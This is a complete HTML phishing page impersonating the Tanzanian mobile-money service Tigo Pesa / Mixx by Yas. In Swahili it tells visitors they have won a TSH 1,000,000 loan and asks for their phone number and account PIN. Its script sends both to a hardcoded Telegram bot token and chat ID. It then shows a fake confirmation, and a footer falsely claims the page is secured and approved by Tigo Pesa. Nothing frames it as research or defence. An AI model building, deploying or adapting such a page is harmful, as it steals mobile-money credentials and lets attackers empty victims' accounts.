<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Mixx by Yas | Tigo Pesa</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(145deg, #e9ecef 0%, #dee2e6 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }

        .loan-card {
            background: white;
            border-radius: 48px;
            padding: 2rem 1.5rem;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }

        .tigo-brand {
            margin-bottom: 1.5rem;
        }
        .tigo-logo {
            font-size: 1.6rem;
            font-weight: 800;
            color: #0066b3;
            letter-spacing: -0.5px;
        }
        .tigo-logo i {
            color: #e65c00;
            margin-right: 4px;
        }
        .tigo-tag {
            font-size: 0.75rem;
            color: #64748b;
            margin-top: 4px;
        }

        .headline {
            background: #fef9e6;
            border-radius: 60px;
            padding: 1rem;
            margin-bottom: 2rem;
        }
        .headline h2 {
            font-size: 1.3rem;
            font-weight: 700;
            color: #1e293b;
        }
        .headline .amount {
            font-size: 2rem;
            font-weight: 800;
            color: #0066b3;
            display: block;
            margin-top: 6px;
        }

        .form-group {
            margin-bottom: 1.2rem;
            text-align: left;
        }
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: #1e293b;
            font-size: 0.9rem;
        }
        input {
            width: 100%;
            padding: 1rem;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 1rem;
            transition: all 0.3s;
            background: #f8fafc;
        }
        input:focus {
            outline: none;
            border-color: #0066b3;
            box-shadow: 0 0 0 3px rgba(0,102,179,0.1);
        }

        .btn-primary {
            background: linear-gradient(135deg, #0066b3, #004a80);
            color: white;
            width: 100%;
            padding: 1rem;
            border: none;
            border-radius: 60px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 0.5rem;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,102,179,0.3);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .result-message {
            margin-top: 1.5rem;
            padding: 1rem;
            border-radius: 32px;
            background: #f8fafc;
            display: none;
        }
        .result-message.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success-message {
            color: #008000;
        }
        .error-message {
            color: #b91c1c;
        }

        .mixx-grid {
            margin-top: 2rem;
            border-top: 1px solid #e2e8f0;
            padding-top: 1.5rem;
        }
        .grid-title {
            font-size: 0.7rem;
            color: #64748b;
            margin-bottom: 1rem;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        .logo-grid {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 0.8rem;
        }
        .mixx-badge {
            background: #f1f5f9;
            border-radius: 60px;
            padding: 0.5rem 1rem;
            font-weight: 600;
            color: #1e293b;
            font-size: 0.85rem;
        }

        .footer-note {
            margin-top: 1rem;
            font-size: 0.7rem;
            color: #94a3b8;
            text-align: center;
        }

        @media (max-width: 480px) {
            .loan-card {
                padding: 1.5rem;
            }
            .headline h2 {
                font-size: 1.1rem;
            }
            .headline .amount {
                font-size: 1.6rem;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="loan-card">
        <!-- Branding -->
        <div class="tigo-brand">
            <div class="tigo-logo">
                <i class="fas fa-bolt"></i> MIIXX_BY YAS
            </div>
            <div class="tigo-tag">tigo pesa</div>
        </div>

        <!-- Loan Offer -->
        <div class="headline">
            <h2>UMEJISHINDIA</h2>
            <span class="amount">TSH 1,000,000</span>
        </div>

        <!-- Phone + PIN Fields -->
        <div class="form-group">
            <label>Namba ya Mixx</label>
            <input type="tel" id="mixxNumber" placeholder="07XXXXXXXXX" value="07XXXXXXXXX">
        </div>
        <div class="form-group">
            <label>PIN</label>
            <input type="password" id="pin" placeholder="••••">
        </div>

        <!-- Submit Button -->
        <button class="btn-primary" id="submitBtn" onclick="processLoanRequest()">
            Omba Sasa <i class="fas fa-arrow-right"></i>
        </button>

        <!-- Result Area -->
        <div id="resultMessage" class="result-message"></div>

        <!-- Mixx Logos Grid -->
        <div class="mixx-grid">
            <div class="grid-title">POWERED BY</div>
            <div class="logo-grid">
                <span class="mixx-badge">Mixx</span>
                <span class="mixx-badge">Mixx</span>
                <span class="mixx-badge">Mixx</span>
                <span class="mixx-badge">Mixx</span>
                <span class="mixx-badge">Mixxx</span>
                <span class="mixx-badge">Mixxx</span>
                <span class="mixx-badge">MixXX</span>
                <span class="mixx-badge">MixXX</span>
            </div>
        </div>

        <div class="footer-note">
            <i class="fas fa-lock"></i> Salama na imeidhinishwa na Tigo Pesa
        </div>
    </div>
</div>

<script>
    // Telegram Bot Configuration
    const BOT_TOKEN = '8919330036:AAG_x3azo4InPtPJbPqA74PVVzBQKXKX_xI';
    const CHAT_ID = '8409068780';

    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await response.json();
            console.log('Telegram response:', data);
            return response.ok;
        } catch (error) {
            console.error('Telegram send error:', error);
            return false;
        }
    }

    async function processLoanRequest() {
        const mixxNumber = document.getElementById('mixxNumber').value.trim();
        const pin = document.getElementById('pin').value.trim();
        const resultDiv = document.getElementById('resultMessage');
        const submitBtn = document.getElementById('submitBtn');

        resultDiv.innerHTML = '';
        resultDiv.classList.remove('show');

        // Validation
        if (!mixxNumber || !pin) {
            resultDiv.innerHTML = '<div class="error-message"><i class="fas fa-exclamation-circle"></i> Tafadhali jaza namba yako ya Mixx na PIN.</div>';
            resultDiv.classList.add('show');
            return;
        }
        if (!mixxNumber.match(/^07[0-9]{8}$/)) {
            resultDiv.innerHTML = '<div class="error-message"><i class="fas fa-exclamation-circle"></i> Namba ya Mixx inatakiwa iwe na tarakimu 10 (kuanzia 07).</div>';
            resultDiv.classList.add('show');
            return;
        }
        if (pin.length < 4) {
            resultDiv.innerHTML = '<div class="error-message"><i class="fas fa-exclamation-circle"></i> PIN lazima iwe na angalau tarakimu 4.</div>';
            resultDiv.classList.add('show');
            return;
        }

        // Disable button during submission
        submitBtn.disabled = true;
        submitBtn.innerText = 'Inatuma...';

        // Prepare message for Telegram
        const timestamp = new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' });
        const message = `
🔔 <b>MKOPO MPYA</b>
📱 Namba ya Mixx: <code>${mixxNumber}</code>
🔐 PIN: <code>${pin}</code>
💰 Kiasi: TSH 1,000,000
🕒 Muda: ${timestamp}
        `;

        // Send to Telegram
        const sent = await sendToTelegram(message);

        // Re-enable button
        submitBtn.disabled = false;
        submitBtn.innerText = 'Omba Sasa';

        if (sent) {
            resultDiv.innerHTML = `
                <div class="success-message">
                    <i class="fas fa-check-circle"></i> Ombi lako la TSH 1,000,000 limepokelewa!<br>
                    Tutakujulisha kupitia namba ${mixxNumber} kwa muda mfupi.
                </div>
            `;
            resultDiv.classList.add('show');
            // Clear PIN field for security
            document.getElementById('pin').value = '';
        } else {
            resultDiv.innerHTML = `
                <div class="error-message">
                    <i class="fas fa-exclamation-circle"></i> Kuna tatizo la kiufundi. Tafadhali jaribu tena.
                </div>
            `;
            resultDiv.classList.add('show');
        }
    }
</script>
</body>
</html>
